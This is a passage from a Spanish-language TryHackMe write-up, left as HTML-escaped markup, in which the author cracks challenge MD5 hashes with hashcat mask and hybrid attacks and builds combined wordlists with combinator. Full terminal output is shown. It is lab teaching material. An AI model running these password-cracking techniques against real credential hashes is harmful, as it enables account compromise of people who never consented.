Progress.........: 10000/10000 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Rejected.........: 0/10000 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Point....: 0/10000 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: TRY-HACK-ME-1234 -&amp;gt; TRY-HACK-ME-5739
Hardware.Mon.#1..: Temp: 55c Util: 15% Core:1189MHz Mem:2505MHz Bus:4

Started: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:35:15 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
Stopped: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:35:19 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
sckull@uplifted:~/tools/hashcat$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;md5-3&#34;&gt;MD5 #3&lt;/h3&gt;
&lt;p&gt;Reto:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;7353d3b528592ecd12139fba62c43287
&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; -m &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; hash.txt TRY-HACK-ME-?d?d?d?d?d
hashcat &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;v5.1.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; starting...

* Device &lt;span class=&#34;c1&#34;&gt;#1: WARNING! Kernel exec timeout is not disabled.&lt;/span&gt;
             This may cause &lt;span class=&#34;s2&#34;&gt;&amp;#34;CL_OUT_OF_RESOURCES&amp;#34;&lt;/span&gt; or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;: Not Supported

OpenCL Platform &lt;span class=&#34;c1&#34;&gt;#1: NVIDIA Corporation&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;======================================&lt;/span&gt;
* Device &lt;span class=&#34;c1&#34;&gt;#1: GeForce MX130, 501/2004 MB allocatable, 3MCU&lt;/span&gt;

Hashes: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; digests&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique digests, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique salts
Bitmaps: &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; bits, &lt;span class=&#34;m&#34;&gt;65536&lt;/span&gt; entries, 0x0000ffff mask, &lt;span class=&#34;m&#34;&gt;262144&lt;/span&gt; bytes, 5/13 rotates

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Brute-Force
* Raw-Hash

Minimum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
Maximum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt;

ATTENTION! Pure &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unoptimized&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenCL kernels selected.
This enables cracking passwords and salts &amp;gt; length &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt; but &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Temperature abort trigger &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to 90c

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  

7353d3b528592ecd12139fba62c43287:TRY-HACK-ME-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: 7353d3b528592ecd12139fba62c43287
Time.Started.....: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:37:10 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Time.Estimated...: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:37:10 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Mask.......: TRY-HACK-ME-?d?d?d?d?d &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;17&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Guess.Queue......: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Speed.#1.........: 17768.1 kH/s &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1.00ms&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; @ Accel:1024 Loops:1 Thr:256 Vec:1
Recovered........: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Digests, 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Salts
Progress.........: 100000/100000 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Rejected.........: 0/100000 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Point....: 0/100000 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: TRY-HACK-ME-12345 -&amp;gt; TRY-HACK-ME-57397
Hardware.Mon.#1..: Temp: 56c Util: 63% Core:1189MHz Mem:2505MHz Bus:4

Started: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:37:07 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
Stopped: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:37:11 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
sckull@uplifted:~/tools/hashcat$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;combination-md5&#34;&gt;Combination (MD5)&lt;/h2&gt;
&lt;p&gt;En esta seccion nos proporcionan tres diccionarios los cuales debemos de combinar segun el reto que se presente, utilizamos combinator de hashcat, el cual utiliza dos diccionarios y los combina (diccionario1diccionario2) para poder crackear un hash.&lt;/p&gt;
&lt;h3 id=&#34;md5-1-1&#34;&gt;MD5 #1&lt;/h3&gt;
&lt;p&gt;Reto:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;a united states city followed by 2 digits (all lowercase)
0f8e6ad80411e27fc85ba1f79153dd8f
&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; -m &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; hash.txt us-city.txt ?d?d
hashcat &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;v5.1.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; starting...

* Device &lt;span class=&#34;c1&#34;&gt;#1: WARNING! Kernel exec timeout is not disabled.&lt;/span&gt;
             This may cause &lt;span class=&#34;s2&#34;&gt;&amp;#34;CL_OUT_OF_RESOURCES&amp;#34;&lt;/span&gt; or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;: Not Supported

OpenCL Platform &lt;span class=&#34;c1&#34;&gt;#1: NVIDIA Corporation&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;======================================&lt;/span&gt;
* Device &lt;span class=&#34;c1&#34;&gt;#1: GeForce MX130, 501/2004 MB allocatable, 3MCU&lt;/span&gt;

Hashes: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; digests&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique digests, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique salts
Bitmaps: &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; bits, &lt;span class=&#34;m&#34;&gt;65536&lt;/span&gt; entries, 0x0000ffff mask, &lt;span class=&#34;m&#34;&gt;262144&lt;/span&gt; bytes, 5/13 rotates

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

Minimum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
Maximum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt;

ATTENTION! Pure &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unoptimized&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenCL kernels selected.
This enables cracking passwords and salts &amp;gt; length &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt; but &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Temperature abort trigger &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to 90c

Dictionary cache built:
* Filename..: us-city.txt
* Passwords.: &lt;span class=&#34;m&#34;&gt;2011&lt;/span&gt;
* Bytes.....: &lt;span class=&#34;m&#34;&gt;19099&lt;/span&gt;
* Keyspace..: &lt;span class=&#34;m&#34;&gt;201100&lt;/span&gt;
* Runtime...: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  

0f8e6ad80411e27fc85ba1f79153dd8f:penn&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;ia46  
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: 0f8e6ad80411e27fc85ba1f79153dd8f
Time.Started.....: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:46:41 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Time.Estimated...: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:46:41 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Base.......: File &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;us-city.txt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Left Side
Guess.Mod........: Mask &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;?d?d&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, Right Side
Guess.Queue.Base.: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Queue.Mod..: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Speed.#1.........: 70748.6 kH/s &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.28ms&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; @ Accel:128 Loops:50 Thr:256 Vec:1
Recovered........: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Digests, 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Salts
Progress.........: 201100/201100 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Rejected.........: 0/201100 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Point....: 0/2011 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Sub.#1...: Salt:0 Amplifier:50-100 Iteration:0-50
Candidates.#1....: alabama13 -&amp;gt; worland68
Hardware.Mon.#1..: Temp: 53c Util: 62% Core:1176MHz Mem:2505MHz Bus:4

Started: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:46:36 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
Stopped: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:46:42 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
sckull@uplifted:~/tools/hashcat$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;md5-2-1&#34;&gt;MD5 #2&lt;/h3&gt;
&lt;p&gt;Reto:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;a united states city followed by a simple color, followed by 3 digits (all lowercase).
fbd527693aceda78b30a978d7d3b9abb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Combinator:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./combinator.bin ../../us-city.txt ../../color.txt &amp;gt; ../../us-city-color.txt
&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
